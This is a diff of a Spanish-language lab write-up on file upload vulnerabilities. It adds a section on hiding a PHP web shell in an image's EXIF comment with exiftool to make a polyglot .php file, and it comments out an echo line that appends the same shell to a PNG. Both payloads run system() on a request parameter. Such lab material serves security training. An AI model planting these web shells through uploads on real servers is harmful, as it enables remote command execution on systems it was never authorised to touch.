@@ -66,10 +66,67 @@ Esto puede ser debido a los `magic bytes` que tienen las imágenes [https://en.w
 
 ![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_7.png)
 
-Otra forma de hacerlo sería `descargar` una `imagen` e `introducir` la `web shell` dentro. Al `capturar` la `petición` con `Burpsuite` se cambiaría la `extensión` de archivo a `.php` y se `enviaría`
+Una forma diferente de hacerlo sería `descargar` una `imagen` e `introducir` la `web shell` dentro. Al `capturar` la `petición` con `Burpsuite` se cambiaría la `extensión` de archivo a `.php` y se `enviaría`
 
 ```
-echo '<?php system($_REQUEST['cmd']); ?>' >> img.png
+# echo '<?php system($_REQUEST['cmd']); ?>' >> img.png
+```
+
+Otra alternativa sería `inyectando metadados dentro de una imagen` mediante `exiftool`. Mediante esta `herramienta` podemos `listar` los `metadatos` de una `imagen`
+
+```
+exiftool image.jpg
+ExifTool Version Number         : 13.25
+File Name                       : image.jpg
+Directory                       : .
+File Size                       : 62 kB
+File Modification Date/Time     : 2025:11:08 20:29:46+01:00
+File Access Date/Time           : 2025:11:08 20:30:27+01:00
+File Inode Change Date/Time     : 2025:11:08 20:30:21+01:00
+File Permissions                : -rw-rw-r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+Image Width                     : 800
+Image Height                    : 800
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 800x800
+Megapixels                      : 0.640
+```
+
+Con este comando `añadimos` un `comentario` a la `imagen` en el cual `inyectamos código php`. He probado 
+
+```
+# exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o image_polyglot.php
+```
+
+Si `inspeccionamos` el `archivo creado` vemos que se ha `insertado` un `nuevo comentario` con nuestro `payload`
+
+```
+# exiftool image_polyglot.php                                                       
+ExifTool Version Number         : 13.25
+File Name                       : image_polyglot.php
+Directory                       : .
+File Size                       : 63 kB
+File Modification Date/Time     : 2025:11:09 11:24:08+01:00
+File Access Date/Time           : 2025:11:09 11:24:08+01:00
+File Inode Change Date/Time     : 2025:11:09 11:24:08+01:00
+File Permissions                : -rw-rw-r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+Comment                         : <?php system($_GET["cmd"]); ?>
+Image Width                     : 800
+Image Height                    : 800
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 800x800
+Megapixels                      : 0.640
 ```
 
 Abrimos nuevamente el `inspector` de `chrome` y vemos que el archivo subido se `aloja` en `/files/avatars`
